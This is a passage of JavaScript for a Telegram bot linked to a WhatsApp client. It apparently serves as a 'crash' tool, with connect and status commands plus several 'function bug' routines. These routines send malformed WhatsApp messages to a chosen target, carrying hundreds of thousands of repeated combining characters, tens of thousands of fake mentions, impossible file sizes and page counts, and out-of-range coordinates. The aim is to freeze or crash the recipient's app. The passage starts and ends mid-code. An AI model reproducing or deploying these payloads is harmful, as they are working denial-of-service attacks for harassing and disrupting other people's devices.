> © 𝐅𝐚𝐦𝐳𝐲 𝐋𝐞𝐞 𝐓𝐞𝐥𝐞 𝐁𝐨𝐭
  `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://wa.me/2348146895993"
  }]];

  ctx.replyWithPhoto("https://i.ibb.co/VWZy3qxT/shaban-md.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/eqteo3.mp3" 
    });
  });
});
bot.command("connect", async ctx => {
  if (isWhatsAppConnected) {
    ctx.reply("✅ WhatsApp is connected.");
    return;
  }
  ctx.reply("🔄 Connecting WhatsApp, please wait...");
  try {
    await startSesi();
    ctx.reply("✅ WhatsApp successfully connected!");
  } catch (error) {
    ctx.reply(`❌ Failed to connect WhatsApp: ${error.message}`);
  }
});
// Function Bug
bot.command("status", ctx => {
  if (isWhatsAppConnected) {
    ctx.reply(`✅ WhatsApp is connected with the number: ${linkedWhatsAppNumber || "Unknown"}`);
  } else {
    ctx.reply("❌ WhatsApp not connected yet.");
  }
});

//function bug
    async function LocSystem(target) {
            let virtex = "⿻ YA ⿻";
            let memekz = Date.now();

            await cella.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "" + "ꦾ".repeat(120000) + "@X".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "FamzyL`" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
        };
  async function f10(target, Ptcp = false) {
    await cella.relayMessage(target, {
      extendedTextMessage: {
        text: "`𝕱𝖆𝖒𝖟𝖞 𝕮𝖗𝖆𝖘𝖍 𝖀𝕴💀`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
        contextInfo: {
          mentionedJid: ["2348146895993@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "2348146895993@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "2348146895993@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs.readFileSync("./famzy.jpg"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "᥊ׁׅׅ꯱tׁׅꭈׁׅυׁׅ݊ꪀׅ꯱҉ UI © Truns",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "2348127187030-1234567890@g.us",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "2348127187030-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbcellaCampaignId: "smb_cella_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log(chalk.red.bold('𝕱𝖆𝖒𝖟𝖞𝕮𝖗𝖆𝖘𝖍𝖀𝕴👿'))
};
async function XeonXRobust(target, Ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = "ꦽ".repeat(10000);
  await cella.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "I Kill You:)❤️",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://i.ibb.co/VWZy3qxT/shaban-md.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "Will You Be Mine? :D" + ui + jids
          },
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            mentions: ["0@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Yea? ThanksYou!",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}
const Sion = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"rorrr ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"rorrr\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ Fa ⿻ Dev ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}
//FUNCTION BUG
  async function inva(target, Ptcp = true) {
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "",
        locationMessage: {},
        hasMediaAttachment: true
       },
       body: {
        text: "🖤𝕱𝖆𝖒𝖟𝖞𝖃𝖙𝖗𝖊𝖒𝖊😈"
       },
       nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: " 𝕱𝖆𝖒𝖟𝖞 𝕮𝖗𝖆𝖘𝖍 𝖀𝕴҉🐒"
       },
       carouselMessage: {}
      }
     }
    }
   }), {
    userJid: target,
    quoted: Sion
   });

   await cella.relayMessage(target, etc.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.red("FLee : Xtreme"));
  };
        async function thunderblast_doc(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `Undefined`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴